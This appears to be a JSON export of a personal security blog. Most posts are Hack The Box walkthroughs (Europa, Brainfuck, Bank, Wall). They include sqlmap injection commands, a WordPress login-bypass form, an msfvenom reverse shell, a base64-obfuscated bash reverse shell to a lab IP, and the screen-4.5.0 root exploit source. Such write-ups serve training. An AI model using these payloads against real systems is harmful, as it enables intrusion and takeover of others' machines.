{
  "posts": {
    "8826QwvyroujAdoibnBf": {
      "title": "test",
      "createdDate": "04-15-2020 17:09",
      "content": "<p>test</p>",
      "author": "XsiSec none"
    },
    "CKZynkun6zOBrqunI6lQ": {
      "levels": [
        "Medium"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
      "content": "<p>I have had a break for a time now but now I doing another box &quot;Europe&quot;:</p>\n\n<p>&nbsp;</p>\n\n<p>I started of with a regular scan</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-100815.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-100815.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I found two DNS:s for the website also added those into the /etc/hosts file--&gt;</p>\n\n<p>&nbsp;</p>\n\n<p>10.10.10.22&nbsp;&nbsp; &nbsp;www.europacorp.htb<br />\n10.10.10.22&nbsp;&nbsp; &nbsp;admin-portal.europacorp.htb</p>\n\n<p>&nbsp;</p>\n\n<p>I run a dirb in background but didnt found any special so I navigated to the admin page:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-100843.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-100843.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I tampered the request also was looking the request data and response like usual within Burp-suite,</p>\n\n<p>&nbsp;</p>\n\n<p>I was stuck for a long time so I decided to check out another guide I knew its vulnerable against sql-injections.</p>\n\n<p>&nbsp;</p>\n\n<p>I was an eloborating with a lots off different sql parameters for sqlmap such below is my outcome:</p>\n\n<p>sqlmap -u &#39;https://admin-portal.europacorp.htb/login.php&#39; --form --dbs --batch<br />\nsqlmap -u &#39;https://admin-portal.europacorp.htb/login.php&#39; --form -D admin --all --batch<br />\nsqlmap -u https://admin-portal.europacorp.htb/login.php --data &quot;email=whatever&amp;password=whatever&quot; --tables -D admin</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-102859.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-102859.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p><br />\nthen I just cracked the md5 hash through hashkillers...</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20191212-102930.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20191212-102930.png\" style=\"height:253px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>when I logged into the page as admin user it looked like any ccms system. I tried to put/post things in the comments,new tasks etc.</p>\n\n<p>but nothing was working. after a while I was looking into the Tools tab</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-120828.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-120828.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>this just look like any post request I could send ot the server and hopefully get some response, even here I was tampering it through burp-suite also i was decoding the content:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-105138.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-105547.png\" style=\"height:106px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>after a while I understood that the pattern &quot;/ip_adress/&quot; replaces the output for the variable &quot;remote-adress&quot;.</p>\n\n<p>then I tried some generic commands for linux such &quot;ls -la&quot;,&quot;cat ./&quot; etc. it worked very well!</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-105547.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-105547.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>I could list all the directories also read files I was very lazy to get the user flag:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-121357.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191212-121357.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Voila first flag captured!</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.22",
      "title": "Europa Part 1 [Hack the box] - [Blog] ",
      "published": {
        "seconds": 1576149604,
        "nanoseconds": 809000000
      },
      
      "author": "XsiSec none"
    },
    "D2MIqEwz31D70InX2jbg": {
      
      "author": "XsiSec",
      "levels": [
        "Hard"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
      "content": "<p><a href=\"https://www.xsisec.com/screenshots/Selection_001.png\" target=\"_blank\"><img alt=\"\" src=\"https://www.xsisec.com/screenshots/Selection_001.png\" style=\"height:266px; width:499px\" /></a></p>\n\n<p>This is so far definitely&nbsp;so far the most tricky box so far.&nbsp;</p>\n\n<p>I tried as much I could on my own, I have only looked into the write-up pdf and which steps:</p>\n\n<p>&nbsp;</p>\n\n<p>Skills Required:<br />\nIntermediate knowledge of Linux<br />\nBasic understanding of RSA<br />\ncryptography</p>\n\n<p><br />\n●&nbsp;Enumerating SSL certificates<br />\n● Exploiting Wordpress<br />\n● Exploit modification<br />\n● Enumerating mail servers<br />\n● Decoding Vigenere ciphers<br />\n● SSH key brute forcing<br />\n● RSA decryption techniques</p>\n\n<p>then I started my information gathering..</p>\n\n<p>added 10.10.10.17 to hosts &gt; brainfuck.htb</p>\n\n<p><strong>nmap -sC -sV -oA nmap 10.10.10.17</strong></p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection_002.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection_002.png\" style=\"height:235px; width:500px\" /></a></p>\n\n<p>when I visted the site I had some issues with the SSL certficate seems like it wasn&#39;t valid so I searched around on good tools to scan ssl cerifcates with I found &#39;sslyze&#39;</p>\n\n<p><strong>sslyze --regular 10.10.10.17</strong></p>\n\n<p>then I verified the certificate in firefox found in the content in the nested object issuer:</p>\n\n<p><em>X509v3 Subject Alternative Name: &nbsp; {&#39;DNS&#39;: [&#39;www.brainfuck.htb&#39;, &#39;sup3rs3cr3t.brainfuck.htb&#39;]}<br />\norestis@brainfuck.htb</em></p>\n\n<p>I also found out the server did not have port 80 open but still was listening on <em>https:/</em></p>\n\n<p>I digged around and found out the webserver is probably&nbsp;&nbsp;is running wordpress.<br />\nI have used a tool before called &#39;<strong>wpscan</strong>&#39; though this time I wanted take it to a new level, I started up this time with just</p>\n\n<p><strong>wpscan --url https://brainfuck.htb&nbsp;</strong></p>\n\n<p>though there was some issues&nbsp;</p>\n\n<p>so it the command became:</p>\n\n<p>wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u</p>\n\n<p><em>--disable-tls-checks&nbsp; // Disables SSL/TLS certificate verification</em></p>\n\n<p>there was few installed plugins.</p>\n\n<p>Title: WP Support Plus Responsive Ticket System &lt;= 7.1.3 &ndash; Authenticated SQL Injection<br />\nTitle: WP Support Plus Responsive Ticket System &lt;= 8.0.7 - Remote Code Execution (RCE)<br />\nTitle: WP Support Plus Responsive Ticket System &lt;= 9.1.1 - Stored XSS<br />\nTitle: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation.</p>\n\n<p>&nbsp;</p>\n\n<p>I also found a lots of directories with dirbuster:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection_003.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection_003.png\" style=\"height:355px; width:500px\" /></a></p>\n\n<p>from my experience so far on other boxes I somehow need to do some kind of &nbsp;privliege escalation so this exploit might fit my needs.<br />\nit was pretty simple&nbsp;</p>\n\n<p><span style=\"color:#c0392b\">&lt;form method=&quot;post&quot; action=&quot;https://brainfuck.htb/wp-admin/admin-ajax.php&quot;&gt;<br />\n&nbsp; &nbsp; &nbsp; &nbsp; Username: &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;admin&quot;&gt;<br />\n&nbsp; &nbsp; &nbsp; &nbsp; &lt;input type=&quot;hidden&quot; name=&quot;email&quot; value=&quot;orestis@brainfuck.htb&quot;&gt;<br />\n&nbsp; &nbsp; &nbsp; &nbsp; &lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;loginGuestFacebook&quot;&gt;<br />\n&nbsp; &nbsp; &nbsp; &nbsp; &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;<br />\n&lt;/form&gt;</span></p>\n\n<p>&nbsp;</p>\n\n<p>then started up a simpleHTTPServer&nbsp;</p>\n\n<p>open localhost:8000/myexploit.html</p>\n\n<p>After clicking on login this comes up a blank white page.</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection_004.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection_004.png\" style=\"height:66px; width:500px\" /></a></p>\n\n<p>Now just simply remove&nbsp;/wp-admin/admin-ajax.php&nbsp;from the url and go back to&nbsp;https://brainfuck.htb&nbsp;you will see the admin toolbar.</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection_005.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection_005.png\" style=\"height:189px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Upload&nbsp; a reverse shell is easy through wordpress but we don&rsquo;t have write access :/ so we have another challenge waiting for us to get to reverse shell.</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection_006.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection_006.png\" style=\"height:290px; width:500px\" /></a></p>\n\n<p>After searching things i found another plugin installed which wpscan didn&rsquo;t find i don&rsquo;t know why but let&rsquo;s take a look at it.</p>\n\n<p>I found following info for the&nbsp;smtp plugin</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection_007.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection_007.png\" style=\"height:410px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>I pressed ctrl + shift + u to view page source and found password:&nbsp;&ldquo;kHGuERB29DNiNE&ldquo;.</p>\n\n<p>I logged on&nbsp; via telnet to brainfuck.htb 143 (according to the nmap port)</p>\n\n<p>I googled some to find userful imap commands:</p>\n\n<p>a1 LOGIN orestis kHGuERB29DNiNE<br />\n<strong>a2 LIST &quot;&quot; &quot;*&quot;<br />\na3 EXAMINE INBOX<br />\na4 FETCH 1 BODY[]<br />\na5 FETCH 2 BODY[]</strong></p>\n\n<p>&nbsp;</p>\n\n<p><em>Hi there, your credentials for our &quot;secret&quot; forum are below :)</em></p>\n\n<p><em>username: orestis<br />\npassword: kIEnnfEKJ#9UmdO</em></p>\n\n<p>I could log on to the forum and once I logged on I found</p>\n\n<p>I found three threads in the forum:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection_008.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection_008.png\" style=\"height:248px; width:500px\" /></a></p>\n\n<p><strong>wget https://10.10.10.17/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa &nbsp;--no-check-certificate flag&nbsp;</strong></p>\n\n<p>download &nbsp;a tool called john the <em>ripper sshng2john.py</em></p>\n\n<p><br />\n&nbsp;then I changed the priveleges for the fille <em>&#39;id_rsa&#39;&nbsp;</em>to chmod 600c</p>\n\n<p>then time to remote via SSH:=)</p>\n\n<p><strong>ssh -i id_rsa orestis@10.10.10.17</strong></p>\n\n<p><strong>cat user.txt:2c11cfbc5b959f73ac15a3310bd097c9</strong></p>\n\n<p><strong>6efc1a5dbb8904751ce6566a305bb8ef</strong></p>\n\n<p>&nbsp;</p>\n\n<p>I also completed the Root flag though it was very complex I checked the write-up but I couldn&#39;t understand all things myself.&nbsp;the thing I still thinking of of &quot;how can people endup with that kind of point&quot;.</p>\n\n<p><br />\nEnjoy! =)</p>\n",
      "ipadress": "10.10.10.17",
      "title": "Brainfuck - Completed [Hack the box] - [Blog]  ",
      "published": {
        "seconds": 1556544888,
        "nanoseconds": 456000000
      }
    },
    "DQURYHyO142KFoEy28jj": {
      "title": "this is another test",
      "createdDate": "04-15-2020 17:09",
      "content": "<p>huiasdhuiasdhasdiu</p><p>adsdhuasidahsdihuhu</p><p>asd</p><p>ashuihiuhiiu</p>",
      "author": "XsiSec none"
    },
    "DnbQOgU8HBchYCKYWNSH": {
      "content": "<p>This box was quite fun pretty simple For the user flag I started up with: with dirb: dirbuster http://bank.htb /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&quot;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-203842.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-203842.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I found support.php very interesting, I was stuck for a while and I missed a really import piece to get futher I didnt tampered the response for the server. since the server redirected me from support.php to login.php</p>\n\n<p>I had to create a role within Burp-suite for the section Proxy&gt;Options&gt;Match and Replace&gt;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-204207.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-204207.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>this was the commands:</p>\n\n<p>Response header</p>\n\n<p>Match:30[12] Found</p>\n\n<p>replace:200 OK</p>\n\n<p>comment:Ignore Redirect</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>once I added this piece I could navigate to the support page:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-204409.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-204409.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I was elobarating a bit for each post I made I was required to upload a file so in first place I generated a php snippet from msfvenom; command:</p>\n\n<p>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php<br />\n&nbsp;</p>\n\n<p>and then modified the orignal request towards the server</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-204608.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-204608.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then I started Metasploit with following exploit:</p>\n\n<p>&nbsp;</p>\n\n<p>msf use exploit/multi/handler<br />\nmsf exploit(multi/handler) set payload php/meterpreter/reverse_tcp<br />\nmsf exploit(multi/handler) set lhost 10.10.14.6<br />\nmsf exploit(multi/handler) set lport 4444 msf exploit(multi/handler) exploit</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-204823.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-204823.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then I got user flag</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-205045.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20191223-205045.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.29",
      "title": "Bank user-flag [Hack the box] - [Blog]  ",
      "published": {
        "seconds": 1577130699,
        "nanoseconds": 649000000
      },
      
      "author": "XsiSec none",
      "levels": [
        "Medium"
      ],
      "image": null,
      "os": [
        "Linux"
      ]
    },
    "Dv7DBl2Wjovik02Z6La2": {
      
      "author": "XsiSec none",
      "levels": [
        "Beginner"
      ],
      "image": null,
      "os": [
        "Software"
      ],
      "content": "<p>Finally I started to work fully again though it has been a lots of work in a new project.<br />\nI also have started another website project where I investigated&nbsp; some cash also after a while I think I definetly can achive some cash back for the pain.<br />\nHowever, meanwhile I was developing a light came from the blue..<br />\nHow did you set up the meta info on this domain? (due its connected to google analytics)</p>\n\n<p><a href=\"http://xsisec.com/screenshots/u8bvedaM5k.png\" target=\"_blank\"><img alt=\"\" src=\"http://xsisec.com/screenshots/u8bvedaM5k.png\" style=\"height:281px; width:500px\" /></a><br />\n<br />\n&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "0.0.0.",
      "title": "Finally back hopefully! also made some improvements on xsisec.com",
      "published": {
        "seconds": 1562508447,
        "nanoseconds": 278000000
      }
    },
    "FSIdVLq6B0aPBnjPgh69": {
      "levels": [
        "Hard"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
      "content": "<p>This is another box I found very difficult I got so much help from other people, honestly I think I will re-analyze what I really did during the box to see if things get even more clear to me.</p>\n\n<p>&nbsp;</p>\n\n<p>I started up with a nmap scan</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-160444.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-160444.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I didnt found anything interesting not even when I did another scan for only open ports.</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-160544.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-160544.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>The page itself wasnt interesting at all,</p>\n\n<p>at the same time like usual I was running in the background Nikto also Gobuster.</p>\n\n<p>&nbsp;</p>\n\n<p>I found one&nbsp; interesting directory &quot;/monitoring&quot;,</p>\n\n<p>&nbsp;</p>\n\n<p>though to display the page I needed to authenticate.</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20200117-160731.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20200117-160731.png\" style=\"height:163px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I was listening to the request in burp-suite also I was playing around with the request method.</p>\n\n<p>this is the original request:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/tvCq6QAovd.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/tvCq6QAovd.png\" style=\"height:250px; width:500px\" /></a></p>\n\n<p>When I changed request method to Post:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/jzo3Ys4stN.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/jzo3Ys4stN.png\" style=\"height:192px; width:500px\" /></a></p>\n\n<p>The request was redirect me somewhere so I pressed on Follow Redirection</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/4HvWUREfq0.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/4HvWUREfq0.png\" style=\"height:240px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>this is what I got 401:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/63bM7FhBVF.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/63bM7FhBVF.png\" style=\"height:240px; width:500px\" /></a></p>\n\n<p>Then I changed request method again to post request:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/OTmA3XbDdX.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/OTmA3XbDdX.png\" style=\"height:222px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>now the response exposed another url Voila --&gt; &quot;/centreon&quot;.</p>\n\n<p>I tried default credentials etc. but no success at alla, I was looking on the centreon api guide how I could authenticate through the web-api.</p>\n\n<p>after this part I was really stuck and my time today was very limited so I was watching @ipsec how he did the the bruteforce.</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20200117-150335.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20200117-150335.png\" style=\"height:225px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>result:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-150259.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-150259.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I could login to the portal I was elobarating a little bit on my own there was a subpage called commands, unfortunately I was not able to read the user flag but I was able to navigate to the directory.</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-161704.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-161704.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>At this point I was stuck and I was a little bit bored so.. I was continue watching @ipsec,</p>\n\n<p>&nbsp;</p>\n\n<p>He did the procedure a way different he was adding commands to a current configuration&nbsp; called &quot;Configure Pollers&quot;.</p>\n\n<p>&nbsp;</p>\n\n<p>this command made me execute a reverse shell</p>\n\n<p>&nbsp;</p>\n\n<p>echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi8xMzM3IDA+JjEK${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash;</p>\n\n<p>&nbsp;</p>\n\n<p>so the first part is only of the encoded base64</p>\n\n<p>bash -i &gt;&amp; /dev/tcp/10.10.14.12/1337</p>\n\n<p>the second part is how the centreon interpret the content.</p>\n\n<p>&nbsp;</p>\n\n<p>then I had a shell for the user unfortunately still not able to read the user flag I was also uploading Linux priveleges escalation scripts but didnt found any useful</p>\n\n<p>@ipsec was using a even better and newer tool for this from this repo <a href=\"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite\">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a></p>\n\n<p>&nbsp;</p>\n\n<p>but then I was looking instead around for other walkthrough some I could really understand and this is what I came up with:</p>\n\n<p>&nbsp;</p>\n\n<p>There were two users on the box:</p>\n\n<p>shelby<br />\nsysmonitor.</p>\n\n<p>I couldn&rsquo;t read the user flag as&nbsp;www-data:</p>\n\n<p>www-data@Wall:/home$ ls -al</p>\n\n<p>total 16<br />\ndrwxr-xr-x 4 root root 4096 Jul 4 00:38 .<br />\ndrwxr-xr-x 23 root root 4096 Jul 4 00:25 ..<br />\ndrwxr-xr-x 6 shelby shelby 4096 Jul 30 17:37 shelby<br />\ndrwxr-xr-x 5 sysmonitor sysmonitor 4096 Jul 6 15:07 sysmonitor<br />\nwww-data@Wall:/home$ cd shelby<br />\nwww-data@Wall:/home/shelby$ cat user.txt<br />\ncat: user.txt: Permission denied<br />\nwww-data@Wall:/home/shelby$</p>\n\n<p>&nbsp;</p>\n\n<p>I searched for&nbsp;suid&nbsp;binaries and saw&nbsp;screen-4.5.0, similar to the privesc in&nbsp;Flujab&nbsp;I used&nbsp;this exploit.<br />\n&nbsp;</p>\n\n<p>The exploit script didn&rsquo;t work properly so I did it manually, I compiled the binaries on my box:<br />\n&nbsp;</p>\n\n<p>libhax.c</p>\n\n<p>#include &lt;stdio.h&gt;<br />\n#include &lt;sys/types.h&gt;<br />\n#include &lt;unistd.h&gt;<br />\n__attribute__ ((__constructor__))<br />\nvoid dropshell(void){<br />\n&nbsp;&nbsp;&nbsp; chown(&quot;/tmp/rootshell&quot;, 0, 0);<br />\n&nbsp;&nbsp;&nbsp; chmod(&quot;/tmp/rootshell&quot;, 04755);<br />\n&nbsp;&nbsp;&nbsp; unlink(&quot;/etc/ld.so.preload&quot;);<br />\n&nbsp;&nbsp;&nbsp; printf(&quot;[+] done!\\n&quot;);<br />\n}</p>\n\n<p>&nbsp;</p>\n\n<p>rootshell.c</p>\n\n<p>#include &lt;stdio.h&gt;<br />\nint main(void){<br />\n&nbsp;&nbsp;&nbsp; setuid(0);<br />\n&nbsp;&nbsp;&nbsp; setgid(0);<br />\n&nbsp;&nbsp;&nbsp; seteuid(0);<br />\n&nbsp;&nbsp;&nbsp; setegid(0);<br />\n&nbsp;&nbsp;&nbsp; execvp(&quot;/bin/sh&quot;, NULL, NULL);<br />\n}</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-162614.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4(HTB)-VMwareWorkstation20200117-162614.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>next step was to upload the compiled script</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>www-data@Wall:/home/shelby$ cd /tmp/<br />\nwww-data@Wall:/tmp$ wget http://10.10.xx.xx/libhax.so<br />\n--2019-12-07 00:23:12--&nbsp; http://10.10.xx.xx/libhax.so<br />\nConnecting to 10.10.xx.xx:80... connected.<br />\nHTTP request sent, awaiting response... 200 OK<br />\nLength: 16144 (16K) [application/octet-stream]<br />\nSaving to: &#39;libhax.so&#39;</p>\n\n<p>libhax.so&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 100%[===================&gt;]&nbsp; 15.77K&nbsp; 11.7KB/s&nbsp;&nbsp;&nbsp; in 1.3s&nbsp;&nbsp; &nbsp;</p>\n\n<p>2019-12-07 00:23:14 (11.7 KB/s) - &#39;libhax.so&#39; saved [16144/16144]</p>\n\n<p>www-data@Wall:/tmp$ wget http://10.10.xx.xx/rootshell<br />\n--2019-12-07 00:23:20--&nbsp; http://10.10.xx.xx/rootshell<br />\nConnecting to 10.10.xx.xx:80... connected.<br />\nHTTP request sent, awaiting response... 200 OK<br />\nLength: 16832 (16K) [application/octet-stream]<br />\nSaving to: &#39;rootshell&#39;</p>\n\n<p>rootshell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 100%[===================&gt;]&nbsp; 16.44K&nbsp; 16.3KB/s&nbsp;&nbsp;&nbsp; in 1.0s&nbsp;&nbsp; &nbsp;</p>\n\n<p>2019-12-07 00:23:22 (16.3 KB/s) - &#39;rootshell&#39; saved [16832/16832]</p>\n\n<p>www-data@Wall:/tmp$</p>\n\n<p>&nbsp;</p>\n\n<p>www-data@Wall:/tmp$ cd /etc<br />\nwww-data@Wall:/etc$ umask 000<br />\nwww-data@Wall:/etc$ /bin/screen-4.5.0 -D -m -L ld.so.preload echo -ne&nbsp; &quot;\\x0a/tmp/libhax.so&quot;<br />\nwww-data@Wall:/etc$ /bin/screen-4.5.0 -ls<br />\n&#39; from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.<br />\n[+] done!<br />\nNo Sockets found in /tmp/screens/S-www-data.</p>\n\n<p>www-data@Wall:/etc$ /tmp/rootshell<br 